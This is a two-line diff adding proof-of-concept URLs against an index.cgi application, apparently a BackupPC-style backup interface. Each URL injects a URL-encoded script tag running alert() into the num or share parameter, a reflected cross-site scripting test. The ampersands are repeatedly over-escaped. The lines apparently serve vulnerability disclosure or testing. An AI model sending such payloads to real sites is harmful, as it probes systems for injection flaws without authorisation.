@@ -1,0 +1,2 @@
+http://www.example.com/index.cgi?action=browse&amp;amp;amp;host=localhost&amp;amp;amp;num=99999%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E
+http://www.example.com/index.cgi?action=RestoreFile&amp;amp;amp;host=localhost&amp;amp;amp;num=1&amp;amp;amp;share=%3Cscript%3Ealert%28234%29%3C/script%3E&amp;amp;amp;dir=
